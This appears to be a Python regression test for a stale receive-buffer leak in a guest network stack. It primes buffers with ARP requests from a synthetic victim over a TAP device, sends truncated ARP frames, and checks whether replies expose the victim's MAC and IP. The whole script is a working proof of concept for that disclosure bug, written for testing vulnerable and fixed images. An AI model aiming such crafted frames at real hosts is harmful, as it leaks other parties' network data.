#!/usr/bin/env python3
"""Probe short-ARP stale receive-buffer bytes using synthetic ARP traffic on TAP.

The test primes RX buffers with full ARP requests from a synthetic MAC/IP,
then sends 24-byte ARP requests that omit the sender and target fields. A
reply containing the previous sender IP demonstrates stale-buffer reuse.
Usage: test_arp_short_frame.py TARGET [expect|reject]
"""
from __future__ import annotations

import os
import select
import socket
import struct
import sys
import time
from pathlib import Path

if len(sys.argv) not in (2, 3):
    raise SystemExit("usage: test_arp_short_frame.py TARGET [expect|observe]")

mode = sys.argv[2] if len(sys.argv) == 3 else "expect"
if mode not in {"expect", "reject"}:
    raise SystemExit("mode must be expect or reject")

target = Path(sys.argv[1]).resolve()
TAP = os.environ.get("TAP", "k2t")
GUEST_IP = socket.inet_aton("10.0.2.15")
VICTIM_IP = socket.inet_aton("198.51.100.77")
VICTIM_MAC = bytes.fromhex("02 00 00 00 00 77")
sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
sock.bind((TAP, 0))
host_mac = sock.getsockname()[4]
broadcast = b"\xff" * 6


def prime_frame() -> bytes:
    header = struct.pack("!HHBBH", 1, 0x0800, 6, 4, 1)
    arp = header + VICTIM_MAC + VICTIM_IP + b"\0" * 6 + GUEST_IP
    return broadcast + VICTIM_MAC + b"\x08\x06" + arp


def short_arp() -> bytes:
    header = struct.pack("!HHBBH", 1, 0x0800, 6, 4, 1)
    return broadcast + host_mac + b"\x08\x06" + header + host_mac[:2]


def is_prime_reply(frame: bytes) -> bool:
    return (
        len(frame) >= 42
        and frame[12:14] == b"\x08\x06"
        and frame[20:22] == b"\x00\x02"
        and frame[32:38] == VICTIM_MAC
        and frame[38:42] == VICTIM_IP
    )


def leaked_marker(frame: bytes) -> bool:
    # The Ethernet destination is the short-frame sender. In the ARP payload,
    # its first two sender-MAC bytes are followed by the prior victim frame's
    # remaining four MAC bytes and complete sender IP.
    return (
        len(frame) >= 42
        and frame[0:6] == host_mac
        and frame[12:14] == b"\x08\x06"
        and frame[20:22] == b"\x00\x02"
        and frame[32:38] == host_mac[:2] + VICTIM_MAC[2:]
        and frame[38:42] == VICTIM_IP
    )


def drain_prime_replies(timeout: float) -> int:
    """Drain normal replies until the TAP socket has been quiet briefly."""
    deadline = time.monotonic() + timeout
    quiet_until = time.monotonic() + 0.25
    count = 0
    while time.monotonic() < deadline and time.monotonic() < quiet_until:
        wait = min(deadline, quiet_until) - time.monotonic()
        ready, _, _ = select.select([sock], [], [], max(0, wait))
        if not ready:
            break
        if is_prime_reply(sock.recv(65536)):
            count += 1
        quiet_until = time.monotonic() + 0.25
    return count


def wait_marker(timeout: float) -> bool:
    ready, _, _ = select.select([sock], [], [], timeout)
    while ready:
        frame = sock.recv(65536)
        if leaked_marker(frame):
            return True
        ready, _, _ = select.select([sock], [], [], 0)
    return False


if __name__ == "__main__":
    try:
        prime = prime_frame()
        short = short_arp()
        # run_tap_ip_arp.sh sets MEM=256. The HSMASK formula gives this
        # guest a 2048-slot per-CPU software ring; the virtio RX queue is
        # capped at 1024. Send 2048 identical valid ARP requests in bounded
        # batches so both rings wrap, draining every normal reply. The primer
        # is a different synthetic sender from the short-frame attacker: the
        # reply must expose the victim's stale MAC suffix and IP to the attacker.
        total_primed = 0
        for batch in range(16):
            for _ in range(128):
                sock.send(prime)
            time.sleep(0.02)
            primed = drain_prime_replies(4.0)
            if primed != 128:
                raise SystemExit(
                    f"FAIL: batch {batch + 1}/16 drained {primed} of 128 full ARP replies"
                )
            total_primed += primed
        print(f"OBSERVED: drained {total_primed} normal replies to full ARP priming requests")
        found = False
        for _ in range(128):
            sock.send(short)
            if wait_marker(0.02):
                found = True
                break
        if mode == "expect" and not found:
            raise SystemExit("FAIL: no short-ARP prior-victim marker was disclosed")
        if mode == "reject" and found:
            raise SystemExit("FAIL: fixed image disclosed the prior-victim marker")
        label = "PASS" if (mode == "expect") == found else "FAIL"
        print(label + (": short ARP reply exposed the prior synthetic victim MAC/IP suffix"
                       if found else ": no prior-victim marker reply observed"))
        print(f"RESULT: short ARP probe completed in mode={mode}")
    finally:
        sock.close()
